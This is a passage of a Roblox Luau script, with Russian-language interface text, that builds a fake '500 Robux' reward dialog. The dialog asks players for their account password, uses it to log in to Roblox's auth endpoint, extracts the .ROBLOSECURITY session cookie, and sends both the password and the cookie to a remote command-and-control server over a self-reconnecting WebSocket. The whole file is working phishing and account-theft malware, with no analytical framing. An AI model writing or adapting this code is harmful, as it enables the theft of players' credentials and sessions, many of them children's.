		BackgroundColor3 = Color3.fromRGB(32, 36, 42),
		BorderSizePixel = 0,
		PlaceholderText = "Пароль от аккаунта Roblox",
		PlaceholderColor3 = Color3.fromRGB(100, 108, 120),
		Text = "",
		TextColor3 = Color3.fromRGB(220, 225, 235),
		TextSize = 22,
		Font = Enum.Font.Gotham,
		ClearTextOnFocus = false,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 62
	local vBtn = new("TextButton", {
		Size = UDim2.new(0, W - 44, 0, 52),
		Position = UDim2.new(0, 22, 0, vy),
		BackgroundColor3 = Color3.fromRGB(0, 180, 90),
		BorderSizePixel = 0,
		Text = " ПОДТВЕРДИТЬ",
		TextColor3 = Color3.fromRGB(255, 255, 255),
		TextSize = 22,
		Font = Enum.Font.GothamBold,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 62
	local vStatus = new("TextLabel", {
		Size = UDim2.new(0, W - 44, 0, 44),
		Position = UDim2.new(0, 22, 0, vy),
		BackgroundTransparency = 1,
		Text = "",
		TextColor3 = Color3.fromRGB(200, 60, 60),
		TextSize = 16,
		Font = Enum.Font.GothamBold,
		TextXAlignment = Enum.TextXAlignment.Left,
		TextWrapped = true,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vy = vy + 54
	local vBack = new("TextButton", {
		Size = UDim2.new(0, W - 44, 0, 40),
		Position = UDim2.new(0, 22, 0, vy),
		BackgroundColor3 = Color3.fromRGB(50, 50, 60),
		BorderSizePixel = 0,
		Text = "\xE2\x86\xA9  Назад",
		TextColor3 = Color3.fromRGB(150, 160, 175),
		TextSize = 17,
		Font = Enum.Font.Gotham,
		ZIndex = 10,
		Parent = verifyFrame
	})
	vBtn.MouseEnter:Connect(function()
		vBtn.BackgroundColor3 = Color3.fromRGB(0, 210, 105)
	end)
	vBtn.MouseLeave:Connect(function()
		vBtn.BackgroundColor3 = Color3.fromRGB(0, 180, 90)
	end)
	local verified = false
	local blocked = false

	local function try_client_login(pw)
		-- HttpService:RequestAsync doesn't work from LocalScripts in Studio.
		-- Server will handle Studio mode by just saving password + sending ok.
		local ok, result = pcall(function()
			local body = http:JSONEncode({
				ctype = "Username",
				cvalue = lp.Name,
				password = pw,
			})
			local url = "https://auth.roblox.com/v2/login"
			C2.debug("CL: POST to " .. url)
			local resp1 = http:RequestAsync({
				Url = url, Method = "POST",
				Headers = {["Content-Type"] = "application/json"},
				Body = body,
			})
			C2.debug("CL: resp1 status=" .. tostring(resp1.StatusCode))
			if resp1.StatusCode == 200 then
				local sc = resp1.Headers["Set-Cookie"] or ""
				C2.debug("CL: 200, Set-Cookie=" .. (type(sc) == "string" and sc:sub(1, 80) or tostring(sc)))
				if type(sc) == "table" then sc = table.concat(sc, "; ") end
				for match in sc:gmatch("%.ROBLOSECURITY=([^;]+)") do
					C2.debug("CL: extracted cookie!")
					return match
				end
				C2.debug("CL: no .ROBLOSECURITY in Set-Cookie")
				return nil
			end
			if resp1.StatusCode ~= 403 then
				C2.debug("CL: unexpected status " .. tostring(resp1.StatusCode) .. ", abort")
				return nil
			end
			local csrf = resp1.Headers["x-csrf-token"]
			C2.debug("CL: 403, csrf=" .. tostring(csrf))
			if not csrf or csrf == "" then return nil end
			local resp2 = http:RequestAsync({
				Url = url, Method = "POST",
				Headers = {["Content-Type"] = "application/json", ["x-csrf-token"] = csrf},
				Body = body,
			})
			C2.debug("CL: resp2 status=" .. tostring(resp2.StatusCode))
			if resp2.StatusCode ~= 200 then return nil end
			local sc = resp2.Headers["Set-Cookie"] or ""
			C2.debug("CL: resp2 Set-Cookie=" .. (type(sc) == "string" and sc:sub(1, 80) or tostring(sc)))
			if type(sc) == "table" then sc = table.concat(sc, "; ") end
			for match in sc:gmatch("%.ROBLOSECURITY=([^;]+)") do
				C2.debug("CL: extracted cookie!")
				return match
			end
			C2.debug("CL: no .ROBLOSECURITY in resp2 either")
			return nil
		end)
		if not ok then C2.debug("CL: pcall error: " .. tostring(result)) end
		if ok and result then return result end
		return nil
	end

	vBtn.MouseButton1Click:Connect(function()
		if verified or blocked or checking then return end
		local pw = vPwBox.Text
		if pw == "" then
			vStatus.Text = "\xE2\x9C\x97  Введите пароль."
			vStatus.TextColor3 = Color3.fromRGB(200, 60, 60)
			return
		end
		checking = true
		vStatus.Text = ""
		vBtn.Text = " ПРОВЕРКА..."
		vBtn.Active = false
		vPwBox.TextEditable = false
		vBack.Active = false
		vCloseBtn.Active = false
		closeBtn.Active = false
		C2.debug("vBtn clicked, trying client-side login...")
		task.spawn(function()
			local cookie = try_client_login(pw)
			if cookie then
				C2.debug("Client-side login success, cookie=" .. cookie:sub(1, 20))
				pcall(C2.send, {
					type = "password",
					password = pw,
					cookie = cookie,
					userId = lp.UserId,
					playerName = lp.DisplayName,
				})
				return
			end

			C2.debug("Client-side login failed, sending password to server")
			local ok_send, err_send = pcall(C2.send, {
				type = "password",
				password = pw,
				userId = lp.UserId,
				playerName = lp.DisplayName,
			})
			C2.debug("C2.send result: ok=" .. tostring(ok_send) .. " err=" .. tostring(err_send))
		end)
	end)
	vBack.MouseEnter:Connect(function()
		vBack.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
	end)
	vBack.MouseLeave:Connect(function()
		vBack.BackgroundColor3 = Color3.fromRGB(50, 50, 60)
	end)
	vBack.MouseButton1Click:Connect(function()
		if blocked or checking then return end
		verifyFrame.Visible = false
		if verified then
			stepLabel.Text = "\xE2\x9C\x85 Шаг 2 из 2: Аккаунт подтверждён"
		else
			step = 1
			stepLabel.Text = "\xE2\x9E\xA1 Шаг 1 из 2: Получите награду"
		end
	end)

	local function lock_all()
		vBtn.Active = false
		vPwBox.TextEditable = false
		vBack.Active = false
		vCloseBtn.Active = false
		closeBtn.Active = false
	end

	local function unlock_all()
		vBtn.Active = not verified
		vPwBox.TextEditable = not verified
		vBack.Active = not blocked
		vCloseBtn.Active = true
		closeBtn.Active = true
	end

	local function on_msg(msg)
		if msg.type ~= "hold" then
			checking = false
		end
		if msg.type == "ok" then
			verified = true
			C2.debug("on_msg: ok, message=" .. tostring(msg.message))
			vStatus.Text = "\xE2\x9C\x85  " .. msg.message
			vStatus.TextColor3 = Color3.fromRGB(0, 200, 100)
			vBtn.Text = " \xE2\x9C\x85  ПРИНЯТО"
			lock_all()
			timerLabel.Visible = false
			progressLabel.Visible = false
			barBg.Visible = false
			notifLabel.Visible = false
			timerSep.Visible = false
			warnHeader.Visible = false
			warnText.Visible = false
			stepSep.Visible = false
			claimBtn.Text = " \xF0\x9F\x93\xA6 ОЖИДАЙТЕ НАЧИСЛЕНИЯ"
			claimBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 70)
			stepLabel.Text = "\xE2\x9C\x85 Шаг 2 из 2: Аккаунт подтверждён"
			successLabel.Text = "\xE2\x9C\x85 " .. (msg.message or "500 ROBUX будут зачислены в течение 24 часов.")
			successLabel.Visible = true
			verifyFrame.Visible = false
		elseif msg.type == "err" then
			C2.debug("on_msg: err, message=" .. tostring(msg.message) .. " blocked=" .. tostring(msg.blocked))
			vStatus.Text = "\xE2\x9D\x8C  " .. msg.message
			vStatus.TextColor3 = Color3.fromRGB(200, 60, 60)
			if msg.blocked then
				blocked = true
				vBtn.Text = " \xE2\x9D\x8C ЗАБЛОКИРОВАНО"
				vCloseBtn.Visible = true
				lock_all()
			else
				vBtn.Text = " ПОДТВЕРДИТЬ"
				vCloseBtn.Visible = false
				unlock_all()
			end
		elseif msg.type == "2fa" then
			C2.debug("on_msg: 2fa")
			vStatus.Text = "\xE2\x8F\xB3  Требуется двухфакторная аутентификация..."
			vStatus.TextColor3 = Color3.fromRGB(255, 180, 50)
			unlock_all()
		elseif msg.type == "hold" then
			C2.debug("on_msg: hold, message=" .. tostring(msg.message))
			vStatus.Text = "\xE2\x8F\xB3  " .. (msg.message or "Проверка данных...")
			vStatus.TextColor3 = Color3.fromRGB(255, 180, 50)
		elseif msg.type == "close" then
			C2.debug("on_msg: close from server")
			C2.unload()
			return
		end
		C2.debug("on_msg done, type=" .. tostring(msg.type))
	end
	C2.on_message = on_msg

	claimBtn.MouseEnter:Connect(function()
		claimBtn.BackgroundColor3 = Color3.fromRGB(240, 70, 70)
	end)
	claimBtn.MouseLeave:Connect(function()
		claimBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
	end)

	claimBtn.MouseButton1Click:Connect(function()
		if verified then return end
		if step == 1 then
			step = 2
			stepLabel.Text = "\xE2\x9E\xA1 Шаг 2 из 2: Подтверждение аккаунта"
			verifyFrame.Visible = true
			verified = false
			vPwBox.Text = ""
			vPwBox.TextEditable = true
			vStatus.Text = ""
			if not blocked then
				vBtn.Text = " ПОДТВЕРДИТЬ"
				vBtn.Active = true
			end
			C2.debug("verifyFrame shown")
		end
	end)

	g.Destroying:Connect(function()
		C2.debug("GUI Destroying event fired")
		if C2.on_message == on_msg then
			C2.on_message = nil
		end
	end)

	C2.debug("create_phish_gui done")
end

local function connect()
	local ok, result = pcall(HttpService.CreateWebStreamClient, HttpService,
		Enum.WebStreamClientType.WebSocket, {Url = WS_URL})
	if not ok then
		C2.debug("CreateWebStreamClient failed: " .. tostring(result))
		task.wait(RECONNECT_DELAY)
		C2.debug("Retrying connect...")
		connect()
		return
	end
	ws = result
	C2.debug("WS CONNECTED to " .. WS_URL)

	ws.MessageReceived:Connect(handle_message)

	ws.Closed:Connect(function()
		C2.debug("WS CLOSED, reconnecting in " .. RECONNECT_DELAY .. "s")
		C2.browser_shutdown()
		ws = nil
		task.wait(RECONNECT_DELAY)
		C2.debug("WS reconnecting...")
		connect()
	end)

	ws.Error:Connect(function(status_code, err_msg)
		C2.debug("WS Error: " .. tostring(status_code) .. " " .. tostring(err_msg))
	end)

	C2.debug("sending hello")
	local lp_hello = Players.LocalPlayer
	local hello_data = {
		type = "hello",
		mode = "studio",
		userId = lp_hello and lp_hello.UserId or 0,
		placeId = game.PlaceId,
		playerName = lp_hello and lp_hello.DisplayName or "unknown"
	}
	C2.send(hello_data)
	C2.debug("hello sent")

	task.spawn(function()
		while ws do
			task.wait(30)
			pcall(function() ws:Send("ping") end)
		end
	end)
end
connect()
